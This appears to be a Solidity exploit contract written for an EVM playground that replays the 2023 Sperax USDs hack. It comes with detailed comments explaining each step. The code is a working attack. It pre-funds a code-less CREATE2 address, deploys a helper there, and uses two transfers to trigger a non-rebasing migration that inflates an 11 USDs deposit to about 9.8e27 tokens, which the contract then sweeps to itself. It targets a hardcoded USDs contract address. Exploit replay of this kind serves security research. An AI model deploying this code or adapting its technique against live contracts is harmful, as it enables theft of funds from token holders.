// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-02-USDs).
//
// The DeFiHackLabs PoC (test/USDs_exp.sol) does NOT use an exploit contract at
// all: the Foundry test itself holds the tokens and calls `vm.etch(addr,
// bytes("code"))` on a plain address (`0x...DeadBeef`) BETWEEN two transfers to
// flip that address from code-less (EOA-like) to a contract, exploiting Sperax
// USDs' `_isNonRebasingAccount()` (AddressUpgradeable.isContract ==
// extcodesize > 0). The playground's recorder has no mid-attack `vm.etch`
// primitive for an ARBITRARY third-party address (only `exploitContract.etchAt`,
// which places the *exploit contract's own* code at a fixed address before
// anything runs — too early for this bug, which specifically needs the target
// to be code-less for the FIRST transfer and only-then a contract for the
// SECOND transfer).
//
// This contract reproduces the same code-less -> contract flip **on-chain**,
// entirely within one recorded call, using the standard CREATE2
// "pre-fund the not-yet-deployed address" trick (see synthetic/DKP.sol's
// ExchangeDKP helper for the same pattern in this repo):
//   1. Compute the CREATE2 address of `Sink` (deployer = this contract).
//      At this point that address has no code (exactly like DeadBeef before
//      vm.etch) -- so USDs buckets it as REBASING when credited.
//   2. Transfer the attacker's 11 USDs to that address. USDs computes
//      `credits = 11e18 * rebasingCreditsPerToken / 1e27` and stores that
//      (appreciated, RCPT < 1e27) credit balance against the code-less Sink
//      address.
//   3. `new Sink{salt}()` -- deploys real runtime code there. This is the
//      on-chain equivalent of `vm.etch`: the address now has `extcodesize > 0`
//      -- but ONLY once the constructor has FINISHED. `AddressUpgradeable.
//      isContract`'s own NatSpec warns that extcodesize returns 0 "for
//      contracts in construction, since the code is only stored at the end of
//      the constructor execution" -- so the migration-triggering transfer
//      CANNOT be called from inside Sink's constructor (extcodesize(Sink)
//      would still read 0 there, defeating the whole point). Sink's
//      constructor deliberately does nothing.
//   4. AFTER `new Sink{salt}()` returns (construction complete, code now
//      installed), `attack()` calls `Sink.trigger()`, which does TWO
//      transfers, in order:
//        a. A 1-wei transfer OUT of Sink -- mirrors the PoC's
//           `vm.prank(DeadBeef); usds.transfer(address(this), 1)`. This is
//           the first transfer OUT of the now-a-contract Sink, so it runs
//           `_isNonRebasingAccount(Sink)`, which now sees `isContract ==
//           true` (extcodesize(Sink) > 0, since construction has completed)
//           and `rebaseState == NotSet`, so it calls
//           `_ensureNonRebasingMigration(Sink)`: this pins
//           `nonRebasingCreditsPerToken[Sink] = 1` while leaving the
//           appreciated `_creditBalances[Sink]` otherwise untouched (only
//           the 1 wei is subtracted as this transfer's value). Crucially,
//           `balanceOf(Sink)` BEFORE this call still reads the REBASING
//           interpretation (~11 USDs, since migration hasn't happened yet)
//           -- reading it earlier would only capture the face value, not
//           the bug.
//        b. NOW that Sink is bucketed non-rebasing, `balanceOf(Sink)` reads
//           `_creditBalances[Sink]` directly (1:1) -- this is where the
//           inflated number (~9.797e27 for an 11 USDs deposit, a rebase
//           factor of 1e27 / RCPT, ~8.9e8x at the fork block) becomes
//           visible. A second transfer sweeps that entire inflated balance
//           to the exploit contract.
//      Sweeping the balance to the exploit contract (rather than leaving it
//      at Sink, as the PoC's illustrative 1-wei-only transfer does) is a
//      measurement convenience: it collects the profit at a config-known,
//      `profitReceiver: "exploit"` address instead of requiring the config
//      to hardcode Sink's CREATE2 address (which depends on the compiled
//      `type(Sink).creationCode`'s build-specific CBOR metadata hash and is
//      therefore not stably predictable at config-authoring time). It does
//      not change the bug: the migration and the resulting inflated
//      credit-to-balance reinterpretation happen identically either way.
//
// Root cause + numbers: see USDs_exp.md in the registry folder. Logic and
// constants (11e18 seed amount, the two-transfer sequence) are copied from
// test/USDs_exp.sol; only the code-less -> contract transition mechanism
// differs (on-chain CREATE2 deploy here vs. `vm.etch` in the Foundry test),
// because the playground's recorder cannot inject code into an arbitrary
// address mid-call. The resulting storage-level effect (credits written under
// the rebasing rate, later read at the non-rebasing rate of 1) is identical.

interface IUSDs {
    function balanceOf(address _account) external returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract USDsExtcodesizeFlip {
    IUSDs internal constant USDS = IUSDs(0xD74f5255D557944cf7Dd0E45FF521520002D5748);

    // entrypoint: recorded by the playground. Called by the attacker, who must
    // already hold 11 USDs (transferred in via a setup step before this runs).
    function attack() external {
        uint256 amount = USDS.balanceOf(address(this));

        bytes memory bytecode = type(Sink).creationCode;
        uint256 salt = uint256(keccak256("usds-sink"));
        address sink = getAddress(bytecode, salt);

        // Step 1: move the appreciated-rate credits onto the still-code-less
        // `sink` address. USDs treats it as REBASING (extcodesize == 0) and
        // stores credits = amount * rebasingCreditsPerToken / 1e27.
        USDS.transfer(sink, amount);

        // Step 2: deploy real code AT that exact address (on-chain analogue of
        // vm.etch). Sink's constructor is a no-op -- extcodesize(sink) reads 0
        // while a contract's OWN constructor is still running (the exact
        // caveat AddressUpgradeable.isContract's NatSpec warns about), so the
        // migration-triggering transfer must NOT be issued from inside the
        // constructor. No constructor args (they would be appended to the
        // init code at deploy time and would NOT be included in
        // `type(Sink).creationCode` above, desyncing getAddress()'s predicted
        // address from the real CREATE2 result).
        Sink sink_ = new Sink{salt: bytes32(salt)}();

        // Step 3: NOW that construction has completed and extcodesize(sink)
        // is nonzero, trigger the migration: Sink sends its USDs balance back
        // out. This is the first transfer OUT of the now-a-contract address --
        // the same role USDs.transfer(address(this), 1) played when pranked
        // from the already-etched DeadBeef in the original PoC (there it was
        // a 1-wei dust transfer only because the PoC wanted a minimal trigger;
        // any nonzero outbound transfer runs _isNonRebasingAccount(_from) and
        // fires the migration the same way, so sweeping the whole balance
        // both triggers the bug AND collects the resulting inflated amount in
        // one call).
        sink_.trigger();
    }

    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }
}

// Throwaway CREATE2-deployed helper. Its sole purpose is to EXIST (give the
// pre-funded address `extcodesize > 0` -- but only once construction has
// completed) and, once called AFTER deployment, trigger the migration by
// sending USDs back out -- the same role as
// `vm.prank(ATTACKER_CONTRACT); usds.transfer(address(this), 1);` in the
// original Foundry PoC (that transfer used 1 wei only because the PoC just
// needed to demonstrate the bug via `balanceOf`; here the same trigger
// transfer sweeps the full inflated balance so the recorder can measure
// profit at a stable address). The constructor is deliberately a no-op:
// calling USDS.transfer from inside it would run
// _isNonRebasingAccount(address(this)) while extcodesize(address(this))
// still reads 0 (code is only stored once the constructor returns), which
// would silently keep Sink bucketed REBASING instead of migrating it --
// exactly the bug this contract exists to trigger. No constructor args (see
// the note in USDsExtcodesizeFlip.attack()) -- `owner` is recorded in the
// constructor (reading `msg.sender`, which is fine post-construction) so
// `trigger()` can forward the swept balance to the deploying
// USDsExtcodesizeFlip contract.
contract Sink {
    IUSDs internal constant USDS = IUSDs(0xD74f5255D557944cf7Dd0E45FF521520002D5748);
    address internal immutable OWNER;

    constructor() {
        OWNER = msg.sender;
    }

    function trigger() external {
        // Two calls are required, not one. `balanceOf(address(this))` BEFORE
        // this point still reads the REBASING interpretation (credits / RCPT
        // = the original face value, ~11 USDs) -- migration hasn't happened
        // yet, so reading the balance first and transferring that amount
        // would only move the face-value amount, leaving the bulk of the
        // (still-rebasing-priced) credits behind. The migration only fires
        // AS A SIDE EFFECT of _executeTransfer's _isNonRebasingAccount(_from)
        // check, i.e. inside a transfer FROM this address.
        //
        // Step A: a minimal (1 wei) transfer OUT -- this is the actual
        // trigger. It runs _isNonRebasingAccount(address(this)), sees
        // extcodesize > 0 for the first time, and calls
        // _ensureNonRebasingMigration: nonRebasingCreditsPerToken is pinned
        // to 1, but `_creditBalances[address(this)]` (the huge, appreciated
        // number) is left otherwise untouched by the migration itself --
        // only the 1 wei is subtracted from it as this transfer's value.
        USDS.transfer(OWNER, 1);

        // Step B: NOW nonRebasingCreditsPerToken[address(this)] != 0, so
        // balanceOf reads `_creditBalances` directly (1:1) -- this is where
        // the inflated number (~9.797e27 for an 11 USDs deposit) becomes
        // visible. Sweep it in a second transfer, also correctly debited
        // 1:1 now that this address is bucketed non-rebasing.
        USDS.transfer(OWNER, USDS.balanceOf(address(this)));
    }
}
